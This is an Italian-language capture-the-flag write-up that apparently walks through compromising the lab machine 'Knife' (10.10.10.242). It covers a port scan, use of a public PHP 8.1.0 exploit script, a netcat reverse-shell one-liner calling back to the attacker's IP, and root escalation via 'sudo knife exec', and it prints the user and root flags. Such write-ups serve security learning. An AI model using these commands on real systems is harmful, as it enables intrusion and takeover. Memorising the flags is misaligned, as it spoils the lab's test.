....
IP: 10.10.10.242
....

....
--> controllo porte aperte

sudo nmap -sC -sV -A 10.10.10.242 -oN namp_scan_1

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea

--> vedo server apache su porta 80 e OpenSSH su porta 22
....

....
PHP 8.1.0
Cerco exploit https://www.exploit-db.com/
scarico exploit 49933.py
lo eseguo e inserisco l'url richiesto

python3 49933.py

--> la shell non è full tty perciò passo a netcat

....

....
--> avvio una netcat sulla porta 1234
nc -lvnp 1234

--> scarico da https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
un comando per la shell netcat, sistemo il mio ip tun0

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.53 1234 >/tmp/f

--> una volta eseguita la reverse shell ottengo tutto funzionate sul netcat listener
....

....
--> mi sposto dalla shell fino alla cartella home/james
trovo il file user.txt lo apro e consegno la flag

cat user.txt
USER FLAG: b272b5ed22899c5eb2e5e9b7d10e69be
....

....
export TERM=xterm

--> vedo che comandi posso usare da non amministratore
sudo -l

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife

--> cerco di ottenere i permessi di root

sudo knife exec --exec "exec '/bin/bash -i'"

bash: cannot set terminal process group (991): Inappropriate ioctl for device
bash: no job control in this shell
root@knife:/home/james#

--> torno alla root
ROOT FLAG: 54973127786b4be1491dcd24cb1c0978
....
